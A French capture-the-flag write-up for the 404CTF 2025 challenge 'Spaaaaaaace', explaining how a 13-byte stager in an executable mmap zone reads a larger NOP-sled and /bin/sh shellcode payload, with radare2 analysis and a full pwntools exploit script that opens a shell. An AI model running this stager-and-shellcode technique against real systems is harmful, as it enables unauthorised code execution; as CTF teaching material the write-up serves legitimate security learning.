# Staged Shellcode â€” Stager + mmap exÃ©cutable

> ğŸ“„ **Challenge rÃ©el : `Spaaaaaaace` â€” 404CTF 2025**

## Table des matiÃ¨res
- [PrÃ©requis](#prÃ©requis)
- [Concepts clÃ©s](#concepts-clÃ©s)
- [Analyser le binaire](#analyser-le-binaire)
- [Ã‰tape 1 â€” Comprendre les contraintes](#Ã©tape-1--comprendre-les-contraintes)
- [Ã‰tape 2 â€” Construire le stager (stage1)](#Ã©tape-2--construire-le-stager-stage1)
- [Ã‰tape 3 â€” Construire le payload final (stage2)](#Ã©tape-3--construire-le-payload-final-stage2)
- [Ã‰tape 4 â€” Exploitation complÃ¨te](#Ã©tape-4--exploitation-complÃ¨te)
- [SchÃ©ma rÃ©capitulatif](#schÃ©ma-rÃ©capitulatif)
- [Erreurs frÃ©quentes](#erreurs-frÃ©quentes)
- [RÃ©sumÃ© des commandes utiles](#rÃ©sumÃ©-des-commandes-utiles)

---

## PrÃ©requis

- ConnaÃ®tre les bases de l'assembleur x86/x64
- Comprendre ce qu'est un syscall Linux
- ConnaÃ®tre les conventions d'appel x64 (registres rdi, rsi, rdx...)
- Avoir `pwntools` installÃ© (`pip install pwntools`)
- Avoir `radare2` installÃ© pour l'analyse statique

---

## Concepts clÃ©s

### mmap et zones exÃ©cutables

`mmap` est un appel systÃ¨me qui alloue une zone mÃ©moire avec des permissions configurables. Ici le programme l'appelle avec `prot=7` :

```c
firmware = mmap(NULL, 0x1000,
    PROT_READ | PROT_WRITE | PROT_EXEC,  // prot = 1+2+4 = 7
    MAP_ANONYMOUS | MAP_PRIVATE,
    -1, 0);
```

Ce qui donne une zone de **4096 octets** qui est Ã  la fois lisible, modifiable **et exÃ©cutable**. C'est cette zone qui stocke le firmware.

> **Note :** NX (No eXecute) est activÃ© sur ce binaire â€” la pile n'est pas exÃ©cutable. Mais `mmap` avec `PROT_EXEC` crÃ©e explicitement une zone exÃ©cutable, ce qui **contourne NX** complÃ¨tement. Ce n'est pas un exploit de NX, c'est le programme lui-mÃªme qui crÃ©e la zone.

### Le principe du Stager

Un **stager** c'est un tout petit bout de code dont le seul rÃ´le est de **charger un payload plus grand**. On l'utilise quand on a une contrainte de taille :

```
SANS stager (impossible ici)         AVEC stager
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€        â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
upload(shellcode_complet)            upload(stage1 = 13 octets)
â†’ trop grand, refusÃ©                 â†’ tient dans la limite
                                     execute(stage1)
                                     â†’ stage1 appelle read()
                                     â†’ on envoie stage2 sans limite
                                     â†’ shell !
```

### Les syscalls Linux x64

Un syscall c'est une faÃ§on d'appeler directement le noyau Linux sans passer par la libc. Les arguments suivent la convention :

| Registre | RÃ´le |
|---|---|
| `rax` | numÃ©ro du syscall |
| `rdi` | argument 1 |
| `rsi` | argument 2 |
| `rdx` | argument 3 |

Le syscall `read` (numÃ©ro 0) s'appelle ainsi :

```asm
xor eax, eax      ; rax = 0 = read
xor edi, edi      ; rdi = 0 = stdin
mov rsi, buf      ; rsi = adresse destination
mov edx, 0x1000   ; rdx = nombre d'octets Ã  lire
syscall
```

---

## Analyser le binaire

### Avec radare2

```bash
r2 ./chall
aaa
afl
pdf @ sym.main
pdf @ sym.upload_update
pdf @ sym.apply_update
```

### VÃ©rifier les protections

```bash
checksec --file=./chall
```

| Protection | Valeur | Impact |
|---|---|---|
| **NX enabled** | Oui | La pile n'est pas exÃ©cutable â€” sans impact ici car mmap crÃ©e une zone exÃ©cutable |
| **PIE enabled** | Oui | Adresses alÃ©atoires â€” sans impact ici car on n'a pas besoin d'adresses fixes |
| **No canary** | Absent | Pas de protection de pile |
| **Partial RELRO** | Partiel | La GOT est partiellement protÃ©gÃ©e |

### Ce qu'on cherche dans main

```asm
mov qword [var_8h], 0xd    â† firmware_max_size = 13 octets !
mov edx, 7                 â† prot = PROT_READ|PROT_WRITE|PROT_EXEC
mov esi, 0x1000            â† taille mmap = 4096 octets
call sym.imp.mmap          â† zone exÃ©cutable allouÃ©e
```

### Ce qu'on cherche dans upload_update

```asm
args(rdi, rsi)             â† rdi = firmware_max_size, rsi = firmware
mov rdx, qword [nbyte]     â† rdx = firmware_max_size (13 octets)
mov rsi, qword [buf]       â† rsi = adresse firmware
mov edi, 0                 â† stdin
call sym.imp.read          â† read(0, firmware, 13)
```

### Ce qu'on cherche dans apply_update

```asm
args(rdi)                  â† rdi = firmware (adresse de la zone mmap)
mov qword [var_8h], rdi    â† sauvegarde sur la pile
mov rdx, qword [var_8h]    â† rdx = firmware (copie de rdi)
call rdx                   â† exÃ©cute le code dans firmware
```

> âš ï¸ **Ã‰tape critique avant d'Ã©crire stage1 â€” toujours vÃ©rifier `args(...)` dans r2 !**
>
> La ligne `args(rdi)` confirme que `firmware` arrive dans `rdi` en entrÃ©e de fonction. En regardant ensuite le corps de la fonction, **aucune instruction ne modifie `rdi`** entre le prologue et le `call rdx`. On peut donc affirmer avec certitude que `rdi = firmware` au moment oÃ¹ stage1 s'exÃ©cute.
>
> Si `args(rdi)` avait montrÃ© `args(rdi, rsi)` avec `rdi` Ã©crasÃ© entre temps, il aurait fallu utiliser un autre registre. **C'est cette analyse qui dicte la premiÃ¨re instruction de stage1** â€” ici `push rdi / pop rsi`. Sans cette vÃ©rification, stage1 pourrait lire une adresse invalide et le programme crasherait silencieusement.

---

## Ã‰tape 1 â€” Comprendre les contraintes

### La limite de 13 octets

```c
long firmware_max_size = 0xd;   // 0xd = 13 en dÃ©cimal
```

VÃ©rifiÃ© dans le dÃ©sassemblage de main :
```asm
mov qword [var_8h], 0xd    â† hardcodÃ© dans main
```

Un shellcode `/bin/sh` standard fait environ 40-50 octets. On ne peut donc pas l'envoyer directement.

### La zone mmap : une opportunitÃ©

```asm
mov edx, 7         â† PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4) = 7
mov esi, 0x1000    â† 4096 octets disponibles
call mmap
```

La zone `firmware` peut contenir 4096 octets et est exÃ©cutable â€” on peut y Ã©crire autant de shellcode qu'on veut si on trouve un moyen de contourner la limite de 13 octets.

### L'idÃ©e : utiliser stage1 pour appeler read()

Si on peut faire exÃ©cuter un `read(0, firmware, 0x1000)` depuis l'intÃ©rieur de `firmware`, on pourra ensuite envoyer autant d'octets qu'on veut â€” sans passer par `upload_update` et sa limite.

---

## Ã‰tape 2 â€” Construire le stager (stage1)

### Objectif

Ã‰crire le syscall `read(0, firmware, 0x1000)` en **13 octets maximum**.

### Exploitation de rdi

Quand `apply_update` appelle `firmware` via `call rdx`, `rdi` pointe encore vers `firmware`. On peut donc s'en servir gratuitement comme adresse de destination du `read` :

```asm
push rdi        ; sauvegarde rdi (= adresse firmware) sur la pile
pop rsi         ; rsi = adresse firmware  â†’ destination du read
mov edx, 0x1000 ; rdx = 4096             â†’ taille max Ã  lire
xor edi, edi    ; rdi = 0                â†’ stdin
xor eax, eax    ; rax = 0                â†’ syscall read
syscall         ; read(0, firmware, 0x1000)
```

### VÃ©rification de la taille

```python
stage1 = asm("""
    push rdi
    pop rsi
    mov edx, 0x1000
    xor edi, edi
    xor eax, eax
    syscall
""", arch="amd64")

print(f"Taille stage1 : {len(stage1)} octets")   # doit Ãªtre <= 13
```

```
push rdi     â†’ 1 octet  (0x57)
pop rsi      â†’ 1 octet  (0x5e)
mov edx,...  â†’ 5 octets (0xba 00 10 00 00)
xor edi, edi â†’ 2 octets (0x31 ff)
xor eax, eax â†’ 2 octets (0x31 c0)
syscall      â†’ 2 octets (0x0f 05)
             = 13 octets pile poil âœ“
```

---

## Ã‰tape 3 â€” Construire le payload final (stage2)

### Le shellcode /bin/sh

Pwntools gÃ©nÃ¨re automatiquement un shellcode `execve("/bin/sh", NULL, NULL)` :

```python
shellcode = shellcraft.amd64.linux.sh()
shellcode = asm(shellcode, arch="amd64")
```

### Le NOP sled

On prÃ©fixe le shellcode avec des NOPs (`\x90`) pour absorber d'Ã©ventuelles imprÃ©cisions sur le point d'entrÃ©e :

```python
sled   = b"\x90" * 23
stage2 = flat(sled, shellcode)
```

> **Pourquoi 23 ?** Stage1 fait 13 octets. Quand stage2 Ã©crase firmware depuis le dÃ©but, les 13 premiers octets de stage2 vont **Ã©craser stage1 en cours d'exÃ©cution**. Le NOP sled garantit qu'aprÃ¨s le `syscall` de stage1, l'exÃ©cution tombe dans du NOP avant d'atteindre le shellcode.

```
firmware aprÃ¨s stage2 :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ \x90 Ã— 23  (NOP sled)           â”‚ â† les 13 premiers octets Ã©crasent stage1
â”‚ shellcode /bin/sh               â”‚ â† le vrai payload
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                â†‘
    stage1 finit son syscall ici
    et glisse jusqu'au shellcode
```

---

## Ã‰tape 4 â€” Exploitation complÃ¨te

### DÃ©roulÃ© de l'attaque

```
option 1 â†’ upload_update(13, firmware)
         â†’ read(stdin, firmware, 13)
         â†’ on envoie stage1 (13 octets)
         â†’ firmware contient maintenant stage1

option 2 â†’ apply_update(firmware)
         â†’ call rdx  (rdx = rdi = firmware)
         â†’ stage1 s'exÃ©cute :
              read(0, firmware, 0x1000)  â† attend une entrÃ©e stdin

option 2 (toujours en attente) â†’ on envoie stage2
         â†’ stage2 s'Ã©crit dans firmware depuis le dÃ©but
         â†’ le syscall read() se termine
         â†’ exÃ©cution continue dans firmware = NOP sled â†’ shellcode
         â†’ shell !
```

### Template d'exploit complet

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or "chall")
context.encoding = "utf-8"

host = "challenges.exemple.fr"
port = 12345

def start():
    if args.LOCAL:
        return process([exe.path])
    return remote(host, port)

# â”€â”€ Construction des stages â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

# Stage 1 : stager de 13 octets
# rdi pointe vers firmware au moment de l'exÃ©cution (confirmÃ© par r2)
stage1 = asm("""
    push rdi        ; rdi = adresse firmware â†’ destination du read
    pop rsi
    mov edx, 0x1000 ; lire jusqu'Ã  4096 octets
    xor edi, edi    ; stdin
    xor eax, eax    ; syscall read = 0
    syscall
""", arch="amd64")

assert len(stage1) <= 13, f"stage1 trop grand : {len(stage1)} octets !"
log.info(f"stage1 : {len(stage1)} octets")

# Stage 2 : NOP sled + shellcode complet
shellcode = asm(shellcraft.amd64.linux.sh(), arch="amd64")
sled      = b"\x90" * 23
stage2    = flat(sled, shellcode)
log.info(f"stage2 : {len(stage2)} octets")

# â”€â”€ Exploit â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
io = start()

# Upload du stager
io.sendlineafter(b">", b"1")
io.sendlineafter(b"Ready to receive update > ", stage1)
log.success("Stage1 uploadÃ©")

# ExÃ©cution du stager â†’ dÃ©clenche read() interne
io.sendlineafter(b">", b"2")

# Le stager attend maintenant sur read() â†’ on envoie le vrai shellcode
io.send(stage2)
log.success("Stage2 envoyÃ©")

io.interactive()   # shell !
```

---

## SchÃ©ma rÃ©capitulatif

```
MÃ‰MOIRE (zone firmware mmap, 4096 octets, RWX)

APRÃˆS upload stage1 :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ push rdi                        â”‚
â”‚ pop rsi                         â”‚  â† 13 octets de stager
â”‚ mov edx, 0x1000                 â”‚
â”‚ xor edi, edi                    â”‚
â”‚ xor eax, eax                    â”‚
â”‚ syscall  â†â”€â”€â”€â”€ exÃ©cution ici    â”‚
â”‚ (vide)                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

PENDANT l'exÃ©cution de stage1 :
stage1 appelle read(0, firmware, 0x1000)
â†’ le programme bloque, attend stdin
â†’ on envoie stage2

APRÃˆS rÃ©ception de stage2 :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ \x90 \x90 \x90 ... (23 NOPs)   â”‚ â† Ã©crase stage1 + zone de sÃ©curitÃ©
â”‚ shellcode execve(/bin/sh)       â”‚ â† le vrai payload
â”‚ ...                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
stage1 termine son syscall â†’ glisse dans les NOPs â†’ shell !

FLUX D'ATTAQUE
1. option 1 â†’ upload stage1 (13 octets) dans firmware
2. option 2 â†’ exÃ©cute stage1 â†’ dÃ©clenche read() interne
3. envoi stage2 â†’ Ã©crase firmware â†’ shell
```

---

## Erreurs frÃ©quentes

### stage1 fait plus de 13 octets
â†’ VÃ©rifier avec `len(stage1)`. Si trop grand, chercher des instructions plus courtes. Par exemple `xor eax, eax` (2 octets) plutÃ´t que `mov eax, 0` (5 octets).

### Le shell s'ouvre mais se ferme immÃ©diatement
â†’ Utiliser `io.interactive()` et non `io.stream()` â€” `interactive()` maintient la connexion bidirectionnelle ouverte.

### stage2 n'est pas exÃ©cutÃ©
â†’ VÃ©rifier que `io.send(stage2)` est bien envoyÃ© **pendant** que stage1 tourne (aprÃ¨s `io.sendlineafter(b">", b"2")`). Ne pas utiliser `sendline` qui ajoute un `\n` parasite.

### "Invalid choice" en boucle
â†’ Le programme utilise `scanf("%d")` pour lire le choix. Envoyer `b"1"` et non `b"1\n"` peut poser problÃ¨me selon le buffering â€” `sendlineafter` gÃ¨re Ã§a automatiquement.

### PIE activÃ© â€” les adresses changent
â†’ Sans impact ici car on n'utilise aucune adresse du binaire. Le shellcode tourne entiÃ¨rement dans la zone `mmap` dont l'adresse est passÃ©e via `rdi`.

---

## RÃ©sumÃ© des commandes utiles

```bash
# Analyse statique
r2 ./chall
aaa
afl
pdf @ sym.main          # trouver firmware_max_size et les flags mmap
pdf @ sym.upload_update # confirmer la limite de read()
pdf @ sym.apply_update  # CRUCIAL : vÃ©rifier args(...) pour savoir quel registre
                        # pointe vers firmware au moment de l'appel
                        # â†’ c'est ce qui dicte la premiÃ¨re instruction de stage1

# Dans le dÃ©sassemblage de apply_update, chercher :
# args(rdi)      â†’ firmware est dans rdi au moment de l'appel
# args(rdi, rsi) â†’ firmware pourrait Ãªtre dans rdi ou rsi selon le contexte
# Puis vÃ©rifier qu'aucune instruction entre le prologue et "call rdx/rax"
# ne modifie ce registre â€” sinon il faut en choisir un autre pour stage1

# VÃ©rifier les protections
checksec --file=./chall

# VÃ©rifier la taille d'un shellcode assemblÃ©
python3 -c "
from pwn import *
s = asm('push rdi\npop rsi\nmov edx,0x1000\nxor edi,edi\nxor eax,eax\nsyscall', arch='amd64')
print(f'{len(s)} octets : {s.hex()}')
"

# Debug de l'exploit
./exploit.py LOCAL DEBUG    # logs dÃ©taillÃ©s
./exploit.py LOCAL GDB      # attache GDB au dÃ©marrage
```

---

*Technique : Staged Shellcode â€” Stager 13 octets + mmap RWX*
*Architecture cible : x86-64 (amd64)*
*Outils : pwntools, radare2*
